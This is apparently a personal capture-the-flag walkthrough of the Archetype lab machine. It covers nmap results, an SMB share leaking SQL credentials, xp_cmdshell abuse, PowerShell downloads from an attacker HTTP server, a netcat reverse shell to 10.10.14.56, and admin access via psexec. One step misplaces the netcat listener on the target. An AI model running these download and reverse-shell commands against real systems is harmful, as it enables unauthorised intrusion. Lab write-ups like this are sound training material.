@@ -1,0 +1,172 @@
+Machine Name - Archetype ( Starting Point)
+
+Machine Ip = export ip="ip_of_the_machine"
+
+The IP will be of tun0
+
+
+
+-->Enumeration -
+
+1. Started nmap scan
+
+->
+
+# Nmap 7.80 scan initiated Wed Jul 10 15:29:41 2024 as: nmap -sV -sC -T4 -o archetype_initialnmap.txt 10.129.95.187
+Nmap scan report for 10.129.95.187
+Host is up (0.34s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info:
+|   Target_Name: ARCHETYPE
+|   NetBIOS_Domain_Name: ARCHETYPE
+|   NetBIOS_Computer_Name: ARCHETYPE
+|   DNS_Domain_Name: Archetype
+|   DNS_Computer_Name: Archetype
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-07-10T09:56:47
+|_Not valid after:  2054-07-10T09:56:47
+|_ssl-date: 2024-07-10T10:00:21+00:00; +5s from scanner time.
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 4s, deviation: 0s, median: 3s
+|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2024-07-10T10:00:17
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jul 10 15:30:16 2024 -- 1 IP address (1 host up) scanned in 35.91 seconds
+
+0-------------------------------------0-------------------
+
+Port 1433 is open means ms-sql database is present.
+
+2. Smbshares are present on 139 and 445.
+
+-> Exploiting with smb tools.
+
+Used linux4enum,smbmap,nmblookup noting from these worked.
+
+---# smbclient -h $ip
+
+- Found the backups share and it had prod.dtsconfig file.
+- get prod.dtsconfig
+
+<DTSConfiguration>
+    <DTSConfigurationHeading>
+        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
+    </DTSConfigurationHeading>
+    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
+        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+    </Configuration>
+</DTSConfiguration>
+
+--# Password and user ID Clearly Seen.
+
+
+
+--> Initial FootHold -
+
+1. mpacket-MSSQLClient Reverse shell for ms-sql server( Let's Run )
+
+python3 mssqlclient.py ARCHETYPE/sql_svc@$ip -windows-auth
+
+Password - M3g4c0rp123
+
+SQL> help ( for the options availabe )
+
+SQL> enable_xp_cmdshell
+
+[*] INFO(RIODB): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(RIODB): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+
+SQL> RECONFIGURE;
+
+2. xp_cmdshell can be used to run the windows commands. (Let's take natcat revershell)
+
+-> Download the natcat64 from github.
+
+-> Run pyton3 -m http.server 8000
+
+-> Run nc -lnvp 4444 on target machine.
+
+
+3. Reverse Shell ( from victim windows to linux )
+
+->  xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.56:8000/nc64.exe  -outfile nc64.exe"
+
+-> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.56 4444”
+
+-> Boom got Reverse Shell.
+
+4. User.txt ( Let's Find user.txt)
+
+user.txt will be found inside the non-administrative user as the name suggests.
+
+Finding the local user.txt
+
+Found in the C:\Users\sql_svc\Desktop\user.txt
+
+-> type user.txt
+3e7b102e78218e935bf3f4951fec21a3
+
+
+--> Privilage Escalation -
+
+1. winPEAS
+
+-> Download from github
+
+-> Transfer from local machine to the victim
+
+-> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.56:8000/winPEAS.bat  -outfile winPEAS.bat"
+
+-> Run with winPEAS.bat
+
+2. Found history file of powershell.
+
+cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+type ConsoleHost_history.txt
+
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+
+-> Found the password of administrator
+
+3. psesec.py ( Let's login through admin user)
+
+-> python3 psexec.py administrator@$ip
+Impacket v0.12.0.dev1+20240626.193148.f827c8c7 - Copyright 2023 Fortra
+
+Password : MEGACORP_4dm1n!!
+
+-> Boom we are in shell.
+
+4. Root.txt ( Let's Find root.txt )
+
+root.txt will be found inside the administrator user.
+
+Found in the C:\Users\adminstrator\Desktop\root.txt
+
+-> type root.txt
+b91ccec3305e98240082d4474b848528
+
+
+
+Machine was fun to solve.
